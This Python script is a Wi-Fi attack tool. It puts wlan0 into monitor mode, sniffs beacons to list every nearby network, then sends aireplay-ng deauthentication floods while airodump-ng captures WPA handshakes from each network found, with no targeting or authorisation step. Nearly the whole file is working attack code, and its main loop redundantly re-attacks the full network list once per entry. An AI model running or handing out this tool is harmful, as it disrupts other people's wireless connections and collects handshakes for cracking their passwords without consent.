import os
import subprocess
from datetime import datetime
import time
from scapy.all import *
import concurrent.futures

tool_directory = None

def create_tool_directory(date):
    global tool_directory
    tool_directory = os.path.join(os.getcwd(), "Tool", date)
    os.makedirs(tool_directory, exist_ok=True)
    return tool_directory

def check_wifi_interface():
    print("[+] Checking if WIFI interface is available..")
    result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return 'wlan0' in result.stdout

def turn_to_monitor_mode(interface):
    print("[+] Getting into Monitor mode")
    subprocess.run(['sudo', 'airmon-ng', 'start', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def get_bssid(ssid):
    result = subprocess.run(['iw', 'dev', 'wlan0', 'scan', 'ssid', ssid], capture_output=True, text=True)
    bssid_lines = [line for line in result.stdout.split('\n') if 'BSS' in line and ssid in line]

    if bssid_lines:
        bssid = bssid_lines[0].split()[1]
        return bssid
    else:
        return None

def get_available_ssids(date):
    print("[+] Getting SSIDs around you...")
    ssid_set = set()
    
    def packet_handler(packet):
        if packet.haslayer(Dot11Beacon) and packet[Dot11Elt].info:
            ssid = packet[Dot11Elt].info.decode("utf-8")
            bssid = packet[Dot11].addr3
            channel = int(ord(packet[Dot11Elt:3].info))
            ssid_set.add((ssid, bssid, channel))

    sniff(iface="wlan0", prn=packet_handler, timeout=30, store=0)

    return list(ssid_set)

def save_ssids_to_file(date, ssid_list):
    with open(f'./Tool/{date}/SSIDs.txt', 'w') as ssid_file:
        for ssid_info in ssid_list:
            ssid_file.write(f"{ssid_info[0]},{ssid_info[1]},{ssid_info[2]}\n")

def capture_handshake(ssid, bssid, channel):
    
    pcap_file = f'{tool_directory}/capture_{ssid}.pcap'

    with concurrent.futures.ThreadPoolExecutor() as executor:
        future_airdump = executor.submit(airdump_capture, bssid, channel, pcap_file)
        future_deauth = executor.submit(deauth_attack, bssid, channel)

        concurrent.futures.wait([future_airdump, future_deauth], timeout=120)  # You can adjust the timeout as needed

def airdump_capture(bssid, channel, pcap_file):
    try:
        airodump_process = subprocess.Popen(['airodump-ng', '--bssid', bssid, '--channel', str(channel), '-w', pcap_file, 'wlan0'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        time.sleep(20)

        airodump_process.terminate()
    except Exception as e:
        print(f"Error in airodump_capture: {e}")


def deauth_attack(bssid, channel):
    try:
        deauth_process = subprocess.Popen(['aireplay-ng', '--deauth', '20', '-a', bssid, 'wlan0'])

        time.sleep(20)

        deauth_process.terminate()
    except Exception as e:
        print(f"Error in deauth_attack: {e}")


def process_lines(filename):
    with open(filename, 'r') as ssid_file:
        ssid_lines = ssid_file.readlines()
        for ssid_line in ssid_lines:
            ssid_info = ssid_line.strip().split(",")
            ssid = ssid_info[0]
            bssid = ssid_info[1] 
            channel = ssid_info[2]
            capture_handshake(ssid, bssid, channel)
            print(f"Finished processing for {ssid}, {bssid}, {channel}")


def main():
    date = datetime.now().strftime("%m-%d-%y").replace('/', '-')

    tool_directory = create_tool_directory(date)

    if not check_wifi_interface():
        print("[!] WiFi interface (wlan0) not found.")
        return

    turn_to_monitor_mode("wlan0")

    ssid_set = get_available_ssids(date)

    save_ssids_to_file(date, ssid_set)
    
    for ssid_info in ssid_set:
        process_lines(f'./Tool/{date}/SSIDs.txt')

if __name__ == "__main__":
    main()
